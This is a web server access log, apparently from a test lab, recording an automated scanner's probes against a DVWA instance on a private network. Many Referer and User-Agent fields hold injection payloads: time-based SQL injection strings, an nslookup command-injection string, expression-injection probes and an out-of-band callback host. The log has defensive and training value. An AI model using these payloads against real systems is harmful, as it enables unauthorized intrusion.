192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "1 \xc0\xa7\xc0\xa2"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "http://hitdY6YqHCGV0.bxss.me/"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "&nslookup XQMRQ1ET&'\\\"`0&nslookup XQMRQ1ET&`'"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "@@cURoR"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "JyI="
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "(select(0)from(select(sleep(4)))v)/*'+(select(0)from(select(sleep(4)))v)+'\"+(select(0)from(select(sleep(4)))v)+\"*/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "\xbf'\xbf\""
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-1; waitfor delay '0:0:6' --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "\xf0''\xf0\"\""
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-1); waitfor delay '0:0:6' --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "(select convert(int,CHAR(65)))"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "1 waitfor delay '0:0:6' --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "qZ1Qk0X7'; waitfor delay '0:0:6' --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-1;select pg_sleep(6); --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-1);select pg_sleep(2); --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "${9999588+9999318}" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-1));select pg_sleep(2); --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "ofUEb4Av';select pg_sleep(2); --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "${10000256+9999742}"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "VQpLIrsu');select pg_sleep(2); --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "Dm7Tgann'));select pg_sleep(4); --" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
